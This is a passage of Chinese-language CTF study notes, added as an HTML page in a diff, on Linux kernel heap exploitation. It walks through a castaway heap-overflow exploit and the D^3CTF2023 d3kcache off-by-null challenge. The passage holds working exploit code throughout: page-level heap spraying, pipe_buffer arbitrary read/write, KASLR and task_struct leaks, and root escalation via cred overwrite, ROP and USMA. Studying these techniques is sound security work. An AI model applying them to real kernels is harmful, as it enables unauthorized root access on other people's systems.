+        &quot;good_end:&quot;
+        &quot;ret;&quot;);
+       
+}
+int main()
+{   pipe(rootfd);
+    pipe(pipe_parent_read);
+    pipe(pipe_child_read);
+    struct request request_cmd;
+    size_t result;
+    puts(&quot;Step 1: Open the vulnurability driver...&quot;);
+    size_t fd = open(&quot;/dev/castaway&quot;, O_RDONLY);
+    bind_core(0);
+    //create child process and Cyclically waiting for the parent process to send commands to allocate or release pages
+    puts(&quot;Step 2: Construct two pipe for communicating in those namespace...&quot;);
+    socker_page_spray_prepare();
+    sleep(0x1);
+    //spray page
+    puts(&quot;Step 3: use setsocket to heap spray many one page &quot;);
+    for(int i = 0; i &lt; 0x400; i++){
+        request_cmd.cmd=alloc_page;
+        request_cmd.idx=i;
+        write(pipe_child_read[1],&amp;request_cmd,sizeof(request_cmd));
+        read(pipe_parent_read[0],&amp;result,sizeof(result));
+    } 
+    puts(&quot;Step 4: spray free next one page to use cred &quot;);
+    for(int i = 0x400/2+1; i &lt; 0x400; i+=2){
+        request_cmd.cmd=free_page;
+        request_cmd.idx=i;
+        write(pipe_child_read[1],&amp;request_cmd,sizeof(request_cmd));
+        read(pipe_parent_read[0],&amp;result,sizeof(result));
+    } 
+    puts(&quot;Step 5: spray clone to alloc page to use cred &quot;);
+    for(int i = 0; i &lt; 0x100; i++){
+            clone_and_getsh(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND,&amp;check_and_wait);
+    } 
+    puts(&quot;Step 6: spray free front one page to use the castaway_ioctl_add &quot;);
+    for(int i = 0x400/2; i &lt; 0x400; i+=2){
+        request_cmd.cmd=free_page;
+        request_cmd.idx=i;
+        write(pipe_child_read[1],&amp;request_cmd,sizeof(request_cmd));
+        read(pipe_parent_read[0],&amp;result,sizeof(result));
+    } 
+    char object_buf[CHUNK_SIZE];
+    *(uint32_t *)&amp;object_buf[CHUNK_SIZE - 0x6] = 1;
+    puts(&quot;Step 7: spray castaway_ioctl_add alloc one page to overflow to cred &quot;);
+   for(int i = 0; i &lt; 0x100; i++){
+        ioctl(fd, ALLOC, 0);
+        struct request_dev req_dev = {.index = i, .size = CHUNK_SIZE, .buf = object_buf};
+        ioctl(fd, EDIT, (unsigned long)&amp;req_dev);
+
+    }
+    write(rootfd[1], object_buf, CHUNK_SIZE);
+    sleep(10000);
+    
+} 
+
+</code></pre>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-025-993cc87052.png" alt="图片"></p>
+<h1 id="off-by-one-页级堆风水页级-uaf">off by one + 页级堆风水（页级 UAF）</h1>
+<p>这种攻击技巧主要指内存页结构体 <code>page</code> 的释放后使用。</p>
+<h2 id="d3ctf2023-d3kcache">D^3CTF2023 d3kcache</h2>
+<h2 id="以-root-身份调试">以 root 身份调试</h2>
+<blockquote>
+<p>感谢 Nightu 和 flyyy 两位师傅的帮助！！</p>
+</blockquote>
+<p>发现虽然 <code>rdinit=/sbin/init</code>，仍然可以通过修改 <code>/etc/init.d/rcS</code> 改变启动权限。</p>
+<h2 id="ext4-文件系统相关打包">ext4 文件系统相关打包</h2>
+<p>用 mount 挂载，复制文件进去，再卸载。</p>
+<pre><code class="language-bash">if [ ! -d rootfs ]; then
+    mkdir rootfs
+fi
+
+sudo mount rootfs.img rootfs
+
+cp exp rootfs/
+sudo umount rootfs
+</code></pre>
+<p>题目说明 flag 位于 /root/flag，文件系统为 ext4，对应的 init 文件在 <code>./etc/init.d/rcS</code>。</p>
+<p><code>d3kcache_ioctl</code> 根据 ioctl 命令执行不同操作：</p>
+<p>   a. 命令 276（创建新 cache）：
+   b. 命令 1300（向现有 cache 追加数据）：
+   c. 命令 2064（释放 cache）：
+   d. 命令 6425（从 cache 读取数据）：</p>
+<p>全局数组 <code>qword_17D8</code> 用于保存 cache 指针，<code>kcache_list</code> 用于保存 cache 大小。</p>
+<pre><code class="language-c">__int64 __fastcall d3kcache_ioctl(__int64 a1, int cmd, __int64 value)
+{
+  __int64 v4; // rax
+  __int64 v5; // rbx
+  int size_2; // ecx
+  char *current_ptr; // r14
+  __int64 size_3; // r15
+  __int64 ptr_1; // r12
+  int size_1; // ecx
+  __int64 size; // rbx
+  __int64 object_ptr; // r14
+  __int64 ptr; // r15
+  __int64 object; // rax
+  __int64 object_1; // r15
+  unsigned int max_range_1; // r13d
+  __int64 size_4; // r14
+  __int64 ptr_2; // r12
+  __int64 index_1; // r14
+  unsigned __int64 index_2; // rbx
+  __int64 max_range; // rax
+  __int64 index; // r12
+  unsigned __int64 index_3; // rbx
+  const char *v25; // rdi
+  struct userdata data; // [rsp-48h] [rbp-48h] BYREF
+  unsigned __int64 v27; // [rsp-38h] [rbp-38h]
+
+  v27 = __readgsqword(0x28u);
+  raw_spin_lock(&amp;spin);
+  v4 = copy_from_user(&amp;data, value, 16LL);
+  v5 = -1LL;
+  if ( v4 )
+    goto LABEL_2;
+  if ( cmd &gt; 0x80F )
+  {
+    if ( cmd == 0x810 )                         // free
+    {
+      if ( data.index &gt; 0xFuLL || !qword_17D8[2 * data.index] )
+      {
+        v25 = &quot;\x011[d3kcache:] Invalid index to release.&quot;;
+        goto LABEL_46;
+      }
+      kmem_cache_free(kcache_jar);
+      index_1 = data.index;
+      if ( (unsigned __int64)data.index &gt; 0xF )
+      {
+        _ubsan_handle_out_of_bounds(&amp;off_12A0, data.index);
+        index_2 = data.index;
+        qword_17D8[2 * index_1] = 0LL;
+        if ( index_2 &gt;= 0x10 )
+          _ubsan_handle_out_of_bounds(&amp;off_12C0, (unsigned int)index_2);
+      }
+      else
+      {
+        qword_17D8[2 * data.index] = 0LL;
+        index_2 = (unsigned int)index_1;
+      }
+      size_array[4 * index_2] = 0;
+      v5 = 0LL;
+    }
+    else
+    {
+      if ( cmd != 0x1919 )                      // read
+        goto LABEL_42;
+      if ( data.index &gt; 0xFuLL || !qword_17D8[2 * data.index] )
+      {
+        v25 = &quot;\x011[d3kcache:] Invalid index to read.&quot;;
+        goto LABEL_46;
+      }
+      size_1 = data.size;
+      if ( data.size &gt; (unsigned int)size_array[4 * data.index] )
+        size_1 = size_array[4 * data.index];
+      if ( size_1 &lt; 0 )
+        BUG();
+      size = (unsigned int)size_1;
+      object_ptr = qword_17D8[2 * data.index];
+      ptr = data.ptr;
+      _check_object_size(object_ptr, (unsigned int)size_1, 1LL);
+      v5 = -(__int64)(copy_to_user(ptr, object_ptr, size) != 0);
+    }
+  }
+  else
+  {
+    if ( cmd != 0x114 )
+    {
+      if ( cmd == 0x514 )
+      {
+        if ( data.index &lt;= 0xFuLL &amp;&amp; qword_17D8[2 * data.index] )// write
+        {
+          size_2 = data.size;
+          if ( data.size &gt; 0x800u || (unsigned int)(data.size + size_array[4 * data.index]) &gt;= 0x800 )
+            size_2 = 2048 - size_array[4 * data.index];
+          if ( size_2 &lt; 0 )
+            BUG();
+          current_ptr = (char *)(qword_17D8[2 * data.index] + (unsigned int)size_array[4 * data.index]);
+          size_3 = (unsigned int)size_2;
+          ptr_1 = data.ptr;
+          _check_object_size(current_ptr, (unsigned int)size_2, 0LL);
+          if ( !copy_from_user(current_ptr, ptr_1, size_3) )
+          {
+            current_ptr[size_3] = 0;
+            v5 = 0LL;
+          }
+          goto LABEL_2;
+        }
+        v25 = &quot;\x011[d3kcache:] Invalid index to write.&quot;;
+LABEL_46:
+        printk(v25);
+        goto LABEL_2;
+      }
+LABEL_42:
+      v25 = &quot;\x011[d3kcache:] Invalid command.&quot;;
+      goto LABEL_46;
+    }
+    if ( data.index &gt;= 0x10uLL )
+    {
+      v25 = &quot;\x011[d3kcache:] Invalid index to allocate.&quot;;
+      goto LABEL_46;
+    }
+    if ( qword_17D8[2 * data.index] )
+    {
+      v25 = &quot;\x011[d3kcache:] Index already in use.&quot;;
+      goto LABEL_46;
+    }
+    object = kmem_cache_alloc(kcache_jar, 0xDC0LL);// add
+    if ( !object )
+    {
+      v25 = &quot;\x011[d3kcache:] Out of memory.&quot;;
+      goto LABEL_46;
+    }
+    object_1 = object;
+    max_range_1 = data.size;
+    size_4 = 0x800LL;
+    if ( data.size &lt; 0x800u )
+      size_4 = (unsigned int)data.size;
+    ptr_2 = data.ptr;
+    _check_object_size(object, size_4, 0LL);
+    if ( copy_from_user(object_1, ptr_2, size_4) )
+    {
+      kmem_cache_free(kcache_jar);
+    }
+    else
+    {
+      max_range = 0x7FFLL;
+      if ( max_range_1 &lt; 0x7FF )
+        max_range = max_range_1;
+      *(_BYTE *)(object_1 + max_range) = 0;
+      index = data.index;
+      if ( (unsigned __int64)data.index &gt; 0xF )
+      {
+        _ubsan_handle_out_of_bounds(&amp;off_1260, data.index);
+        index_3 = data.index;
+        qword_17D8[2 * index] = object_1;
+        if ( index_3 &gt;= 0x10 )
+          _ubsan_handle_out_of_bounds(&amp;off_1280, (unsigned int)index_3);
+      }
+      else
+      {
+        qword_17D8[2 * data.index] = object_1;
+        index_3 = (unsigned int)index;
+      }
+      size_array[4 * index_3] = size_4;
+      v5 = 0LL;
+    }
+  }
+LABEL_2:
+  raw_spin_unlock(&amp;spin);
+  return v5;
+}
+</code></pre>
+<h3 id="struct-page-指针线性映射区与-vmemmap"><code>struct page</code> 指针、线性映射区与 vmemmap</h3>
+<h4 id="1-线性映射区与物理地址的关系">1. 线性映射区与物理地址的关系</h4>
+<p>在 Linux 内核中，<strong>线性映射区</strong>（也称直接映射区）是虚拟地址空间的一部分，用于直接映射物理内存地址。这意味着，给定物理地址，加上固定偏移（<code>PAGE_OFFSET</code>）即可得到它在线性映射区中的虚拟地址，反之亦然。</p>
+<p>在 x86_64 架构上，<code>PAGE_OFFSET</code> 一般为 <code>0xffff888000000000</code>，即内核线性映射区的起始地址。假设有一个线性映射区虚拟地址 <code>0xffff888012345000</code>，减去 <code>PAGE_OFFSET</code> 就能得到对应的物理地址。</p>
+<h4 id="2-计算物理地址">2. 计算物理地址</h4>
+<p>假设 <code>PAGE_OFFSET</code> 为 <code>0xffff888000000000</code>：</p>
+<pre><code class="language-c">unsigned long linear_address = 0xffff888012345000;
+unsigned long physical_address = linear_address - PAGE_OFFSET;
+</code></pre>
+<p>结果为：</p>
+<pre><code class="language-c">physical_address = 0xffff888012345000 - 0xffff888000000000
+                 = 0x12345000
+</code></pre>
+<p>这个物理地址为 <code>0x12345000</code>。</p>
+<h4 id="3-将物理地址转换为-struct-page-指针">3. 将物理地址转换为 <code>struct page</code> 指针</h4>
+<p>在 Linux 内核中，物理内存页通过 <code>struct page</code> 结构体管理。每个物理页都有对应的 <code>struct page</code> 结构体，这些结构体通常连续存放在内核数组中（<code>vmemmap</code> 数组是全局数组，映射全部物理页的 struct page 结构体；数组的每个元素都对应一个物理页的 struct page 结构体）。这个数组的每个元素对应一个物理页。</p>
+<p>将物理地址转换为 <code>struct page</code> 指针，需要以下步骤：</p>
+<ol>
+<li><p><strong>将物理地址转换为页帧号（PFN）</strong>：</p>
+<ul>
+<li>页帧号等于物理地址除以页面大小（通常为 4KB）。</li>
+</ul>
+<pre><code class="language-c">unsigned long pfn = physical_address &gt;&gt; PAGE_SHIFT;
+</code></pre>
+<p>这里的 <code>PAGE_SHIFT</code> 是页面大小对应的移位量；页面大小为 4KB 时，<code>PAGE_SHIFT</code> 为 12。</p>
+</li>
+<li><p><strong>将页帧号转换为 <code>struct page</code> 指针</strong>：</p>
+<ul>
+<li>内核提供宏 <code>pfn_to_page(pfn)</code>，通过页帧号找到对应的 <code>struct page</code> 结构体。该宏的结果是 vmemmap 数组中 PFN 对应的 struct page 结构体的虚拟地址。</li>
+</ul>
+<pre><code class="language-c">struct page *page = pfn_to_page(pfn);
+</code></pre>
+</li>
+</ol>
+<h4 id="示例代码">示例代码</h4>
+<p>结合以上步骤，代码如下：</p>
+<pre><code class="language-c">#define PAGE_OFFSET 0xffff888000000000UL
+#define PAGE_SHIFT 12
+
+unsigned long linear_address = 0xffff888012345000;
+unsigned long physical_address = linear_address - PAGE_OFFSET;
+unsigned long pfn = physical_address &gt;&gt; PAGE_SHIFT;
+struct page *page = pfn_to_page(pfn);
+</code></pre>
+<h3 id="pipebuffer">pipebuffer</h3>
+<p><a href="https://www.51cto.com/article/684282.html">https://www.51cto.com/article/684282.html</a></p>
+<p>fcntl 重新分配大小时，先执行 kcalloc，再将原 pipebuffer 中的内容（已有数据的页面）复制到 kcalloc 分配的 pipebuffer。</p>
+<p>读：pipebuffer 通过 pipebuffer-&gt;offset、pipebuffer-&gt;len 和 page 读取；读取后，<code>pipebuffer-&gt;offset = pipebuffer-&gt;offset + pipebuffer-&gt;len</code>
+写：pipebuffer 从 <code>pipebuffer-&gt;offset + pipebuffer-&gt;len</code> 开始写入，并且 <code>pipebuffer-&gt;len = pipebuffer-&gt;len + number of bytes written</code></p>
+<p>另外，只有向管道写入时，才会为 page 分配物理页。</p>
+<h3 id="利用-3">利用</h3>
+<p>漏洞位于命令 1300（向现有 cache 追加数据）：存在 off-by-null 漏洞。</p>
+<p>由于这是独立 cache，没有其他结构体与其共享 cache。但来自伙伴系统同一 order 的 cache，其结构体可以相邻，因此只能考虑通过页级堆风水造成跨 cache 的情况。</p>
+<h3 id="第一级页-uaf">第一级页 UAF</h3>
+<p>这里考虑相同的 order：2k 对应 order 3，因此也寻找分配 order 3 的 cache，使两者可能来自同一个 order-4 内存块。这样两个 order-3 cache 相邻，前一个 order-3 cache 的最后一个对象为 kcache_jar，后一个 order-3 cache 的第一个对象恰好是某个结构体对象，就可以通过 off-by-null 溢出该结构体。</p>
+<ul>
+<li>因为需要它们来自同一个 order-4 内存块，具体而言是两个物理地址相邻的内存块，所以可以分配大部分 order-3 内存块，消耗不连续的部分，再得到连续的一段 order-3 内存。为保证相邻，可以先喷一些 slab，再分配一个 kcache_jar slab，然后再喷一些 slab，让 kcache_jar 夹在希望溢出的 slab 中。</li>
+</ul>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-026-aa41599107.png" alt="图片"></p>
+<ul>
+<li>然后，获得页级 UAF 后，关闭其中一个。
+<img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-027-4da213dab6.png" alt="图片"></li>
+</ul>
+<h3 id="第二级页-uaf">第二级页 UAF</h3>
+<p>通过 fcntl 改变 pipebuffer 数量，重新分配一个 kmalloc-96 大小的对象，用于存放 pipebuffer 数组。再用 pipebuffer 填充已释放页面，这样就可以通过页 UAF 读出其中一条管道的 pipebuffer，再通过写入修改相邻管道的 pipebuffer，使两条管道包含相同的 pipebuffer。随后关闭包含已读出 pipebuffer 的管道，此时被写入的那条管道的 pipebuffer 就形成了 UAF。</p>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-028-a22465ff03.png" alt="图片"></p>
+<h3 id="任意读写">任意读写</h3>
+<p>使用 fcntl 改变 pipebuffer 数量并重新分配，申请 kmalloc-192 存放 pipebuffer。随后用 kmalloc-192 的 pipebuffer 填满第二级 UAF 页面，将三条管道中每条管道的第一个 pipebuffer 都写成之前读出的 pipebuffer，并将 offset 和 len 均设为 192。这样读取时，就能读到之前泄露的 pipebuffer，而它的 page 恰好是当前第二级 UAF 页面。</p>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-029-d017cc04f1.png" alt="图片"></p>
+<ul>
+<li>扫描并读取每条管道；若 page 为第二级 UAF 页面，就能读出该页面。如果内容与之前读出的一致，就可以确定当前管道是三条管道之一，进而识别出全部三条管道。</li>
+<li>随后构建任意读写：先通过第 3 个 pipebuffer 写入，将第 2 个 pipebuffer 的 offset 设为第 3 个 pipebuffer 的偏移。然后按如下方式循环：首先，第 2 个 pipebuffer 可以将第 3 个 pipebuffer 的 offset 写成第 1 个 pipebuffer 的偏移；此时第 3 个 pipebuffer 就能写入第 1 和第 2 个 pipebuffer——将第 1 个 pipebuffer 的 page 写为待读取的 page，再将第 2 个 pipebuffer 的 offset 写为第 3 个 pipebuffer 的偏移。
+<img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-030-70bbcc39cc.png" alt="图片"></li>
+</ul>
+<h3 id="泄露-task_struct-和-kernel_base">泄露 task_struct 和 kernel_base</h3>
+<ul>
+<li>首先，根据 page 和粒度，通过异或推测 vmemmap_base。</li>
+<li>然后，由于第 156 页开头包含 <code>secondary_startup_64</code> 函数的地址，可以得到偏移，进而得到基址。</li>
+</ul>
+<pre><code class="language-c">  /**
+     * KASLR&#39;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,
+     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.
+     * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,
+     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.
+     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.
+     */
+    vmemmap_base = (size_t) info_pipe_buf.page &amp; 0xfffffffff0000000;
+    for (;;) {
+        arbitrary_read_by_pipe((struct page*) (vmemmap_base + 157 * 0x40), buf);
+
+        if (buf[0] &gt; 0xffffffff81000000 &amp;&amp; ((buf[0] &amp; 0xfff) == 0x070)) {
+            kernel_base = buf[0] -  0x070;
+            kernel_offset = kernel_base - 0xffffffff81000000;
+            printf(&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;
+                   &quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;, 
+                   kernel_base, kernel_offset);
+            break;
+        }
+
+        vmemmap_base -= 0x10000000;
+    }
+    printf(&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;, vmemmap_base);
+</code></pre>
+<ul>
+<li>使用 prctl 设置当前进程名。</li>
+<li>扫描页面，根据进程名找到 task_struct，通过 task_struct::ptraced 指针泄露当前 task_struct，并根据它所在的 page 推导出 page_offset_base。</li>
+</ul>
+<pre><code class="language-c">/* now seeking for the task_struct in kernel memory */
+    puts(&quot;[*] Seeking task_struct in memory...&quot;);
+
+    prctl(PR_SET_NAME, &quot;arttnba3pwnn&quot;);
+
+    /**
+     * For a machine with MEM less than 256M, we can simply get the:
+     *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;
+     * But that&#39;s not always accurate, espacially on a machine with MEM &gt; 256M.
+     * So we need to find another way to calculate the page_offset_base.
+     * 
+     * Luckily the task_struct::ptraced points to itself, so we can get the
+     * page_offset_base by vmmemap and current task_struct as we know the page.
+     * 
+     * Note that the offset of different filed should be referred to your env.
+     */
+    for (int i = 0; 1; i++) {
+        arbitrary_read_by_pipe((struct page*) (vmemmap_base + i * 0x40), buf);
+
+        comm_addr = memmem(buf, 0xf00, &quot;arttnba3pwnn&quot;, 12);
+        if (comm_addr &amp;&amp; (comm_addr[-2] &gt; 0xffff888000000000) /* task-&gt;cred */
+            &amp;&amp; (comm_addr[-3] &gt; 0xffff888000000000) /* task-&gt;real_cred */
+            &amp;&amp; (comm_addr[-57] &gt; 0xffff888000000000) /* task-&gt;read_parent */
+            &amp;&amp; (comm_addr[-56] &gt; 0xffff888000000000)) {  /* task-&gt;parent */
+
+            /* task-&gt;read_parent */
+            parent_task = comm_addr[-57];
+
+            /* task_struct::ptraced */
+            current_task = comm_addr[-50] - 2528;
+
+            page_offset_base = (comm_addr[-50]&amp;0xfffffffffffff000) - i * 0x1000;
+            page_offset_base &amp;= 0xfffffffff0000000;
+
+            printf(&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;,
+                   (struct page*) (vmemmap_base + i * 0x40));
+            printf(&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;,
+                   page_offset_base);
+            printf(&quot;\033[34m\033[1m[*] current task_struct&#39;s addr: \033[0m&quot;
+                   &quot;0x%lx\n\n&quot;, current_task);
+            break;
+        }
+</code></pre>
+<h3 id="提权">提权</h3>
+<h4 id="通过-init_cred-提权">通过 init_cred 提权</h4>
+<p>沿当前 task_struct 的 real_parent（即父进程 task_struct 的虚拟地址）向上查找，直到 real_parent 指向自身，这就是 <code>init_task</code>。然后将 init_task 的 init_cred 写入当前 task_struct 的 cred 指针，使其指向 init_cred。</p>
+<h4 id="在内核栈上写入-rop">在内核栈上写入 ROP</h4>
+<p>可以通过 mm_struct 得到页表地址，通过 task_struct 得到 mm_struct 地址；内核栈地址同样可以通过 task_struct 得到。</p>
+<p>通过 task_struct 的 stack 指针可以得到内核栈地址，再通过页表转换得到栈的物理地址，进而得到对应的 page。之后就可以向对应 page 喷射 ROP，实现提权。</p>
+<h4 id="usma">USMA</h4>
+<ul>
+<li>mmap 一片内存，修改页表，使 mmap 得到的虚拟内存映射到 ns_capable_setid 函数对应的物理地址。再向 mmap 区域写入 shellcode，以修改 ns_capable_setid 函数。这里 ns_capable_setid 所在的代码段是 2M 大页，而非 4K 内存页，因此通过三级页表而非四级页表解析。所以，mmap 虚拟内存最终映射的第四级页表中的页表项，为一个 2M 大页的地址。</li>
+<li>shellcode 可以让 ns_capable_setid 的返回值始终为 1。调用 setresuid(0, 0, 0) 提权时，会通过 ns_capable_setid 判断是否允许。修改 ns_capable_setid 函数后，就能使用 setresuid(0, 0, 0) 提权。</li>
+</ul>
+<h3 id="exp-6">exp</h3>
+<pre><code class="language-c">#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
+
+#include &lt;asm/ldt.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;ctype.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;linux/keyctl.h&gt;
+#include &lt;linux/userfaultfd.h&gt;
+#include &lt;poll.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;semaphore.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;stdbool.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/msg.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;sys/sem.h&gt;
+#include &lt;sys/shm.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/xattr.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/sysinfo.h&gt;
+
+int randint(int min, int max) {
+    return min + (rand() % (max - min));
+}
+
+void bind_core(bool fixed, bool thread) {
+    cpu_set_t cpu_set;
+    CPU_ZERO(&amp;cpu_set);
+    CPU_SET(fixed ? 0 : randint(1, get_nprocs()), &amp;cpu_set);
+    if (thread) {
+        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set), &amp;cpu_set);
+        //用于设置某个线程的 CPU 亲和性。
+    } else {
+        sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);
+        //用于设置整个进程的 CPU 亲和性。
+    }
+}
+
+void qword_dump(char *desc, void *addr, int len) {
+    uint64_t *buf64 = (uint64_t *) addr;
+    uint8_t *buf8 = (uint8_t *) addr;
+    if (desc != NULL) {
+        printf(&quot;[*] %s:\n&quot;, desc);
+    }
+    for (int i = 0; i &lt; len / 8; i += 4) {
+        printf(&quot;  %04x&quot;, i * 8);
+        for (int j = 0; j &lt; 4; j++) {
+            i + j &lt; len / 8 ? printf(&quot; 0x%016lx&quot;, buf64[i + j]) : printf(&quot;                   &quot;);
+        }
+        printf(&quot;   &quot;);
+        for (int j = 0; j &lt; 32 &amp;&amp; j + i * 8 &lt; len; j++) {
+            printf(&quot;%c&quot;, isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : &#39;.&#39;);
+        }
+        puts(&quot;&quot;);
+    }
+}
+
+void byte_dump(char *desc, void *addr, int len) {
+    uint8_t *buf8 = (unsigned char *) addr;
+    if (desc != NULL) {
+        printf(&quot;[*] %s:\n&quot;, desc);
+    }
+    for (int i = 0; i &lt; len; i += 16) {
+        printf(&quot;  %04x&quot;, i);
+        for (int j = 0; j &lt; 16; j++) {
+            i + j &lt; len ? printf(&quot; %02x&quot;, buf8[i + j]) : printf(&quot;   &quot;);
+        }
+        printf(&quot;   &quot;);
+        for (int j = 0; j &lt; 16 &amp;&amp; j + i &lt; len; j++) {
+            printf(&quot;%c&quot;, isprint(buf8[i + j]) ? buf8[i + j] : &#39;.&#39;);
+        }
+        puts(&quot;&quot;);
+    }
+}
+
+bool is_kernel_text_addr(size_t addr) {
+    return addr &gt;= 0xFFFFFFFF80000000 &amp;&amp; addr &lt;= 0xFFFFFFFFFEFFFFFF;
+//    return addr &gt;= 0xFFFFFFFF80000000 &amp;&amp; addr &lt;= 0xFFFFFFFF9FFFFFFF;
+}
+
+bool is_dir_mapping_addr(size_t addr) {
+    return addr &gt;= 0xFFFF888000000000 &amp;&amp; addr &lt;= 0xFFFFc87FFFFFFFFF;
+}
+
+size_t user_cs, user_rflags, user_sp, user_ss;
+
+void save_status() {
+    __asm__(&quot;mov user_cs, cs;&quot;
+            &quot;mov user_ss, ss;&quot;
+            &quot;mov user_sp, rsp;&quot;
+            &quot;pushf;&quot;
+            &quot;pop user_rflags;&quot;);
+    puts(&quot;[*] status has been saved.&quot;);
+}
+
+/**
+ * @brief create an isolate namespace
+ * note that the caller **SHOULD NOT** be used to get the root, but an operator
+ * to perform basic exploiting operations in it only
+ */
+void unshare_setup(void) {
+    char edit[0x100];
+    int tmp_fd;
+
+    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);
+
+    tmp_fd = open(&quot;/proc/self/setgroups&quot;, O_WRONLY);
+    write(tmp_fd, &quot;deny&quot;, strlen(&quot;deny&quot;));
+    close(tmp_fd);
+
+    tmp_fd = open(&quot;/proc/self/uid_map&quot;, O_WRONLY);
+    snprintf(edit, sizeof(edit), &quot;0 %d 1&quot;, getuid());
+    write(tmp_fd, edit, strlen(edit));
+    close(tmp_fd);
+
+    tmp_fd = open(&quot;/proc/self/gid_map&quot;, O_WRONLY);
+    snprintf(edit, sizeof(edit), &quot;0 %d 1&quot;, getgid());
+    write(tmp_fd, edit, strlen(edit));
+    close(tmp_fd);
+}
+/**
+ * III -  pgv pages sprayer related
+ * not that we should create two process:
+ * - the parent is the one to send cmd and get root
+ * - the child creates an isolate userspace by calling unshare_setup(),
+ *      receiving cmd from parent and operates it only
+ */
+#define PGV_PAGE_NUM 1000
+#define PACKET_VERSION 10
+#define PACKET_TX_RING 13
+
+struct tpacket_req {
+    unsigned int tp_block_size;
+    unsigned int tp_block_nr;
+    unsigned int tp_frame_size;
+    unsigned int tp_frame_nr;
+};
+
+/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
+struct pgv_page_request {
+    int idx;
+    int cmd;
+    unsigned int size;
+    unsigned int nr;
+};
+
+/* operations type */
+enum {
+    CMD_ALLOC_PAGE,
+    CMD_FREE_PAGE,
+    CMD_EXIT,
+};
+
+/* tpacket version for setsockopt */
+enum tpacket_versions {
+    TPACKET_V1,
+    TPACKET_V2,
+    TPACKET_V3,
+};
+
+/* pipe for cmd communication */
+int cmd_pipe_req[2], cmd_pipe_reply[2];
+
+/* create a socket and alloc pages, return the socket fd */
+int create_socket_and_alloc_pages(unsigned int size, unsigned int nr) {
+    struct tpacket_req req;
+    int socket_fd, version;
+    int ret;
+
+    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
+    if (socket_fd &lt; 0) {
+        printf(&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;);
+        ret = socket_fd;
+        goto err_out;
+    }
+
+    version = TPACKET_V1;
+    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,
+                     &amp;version, sizeof(version));
+    if (ret &lt; 0) {
+        printf(&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;);
+        goto err_setsockopt;
+    }
+
+    memset(&amp;req, 0, sizeof(req));
+    req.tp_block_size = size;
+    req.tp_block_nr = nr;
+    req.tp_frame_size = 0x1000;
+    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
+
+    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, sizeof(req));
+    if (ret &lt; 0) {
+        printf(&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;);
+        goto err_setsockopt;
+    }
+
+    return socket_fd;
+
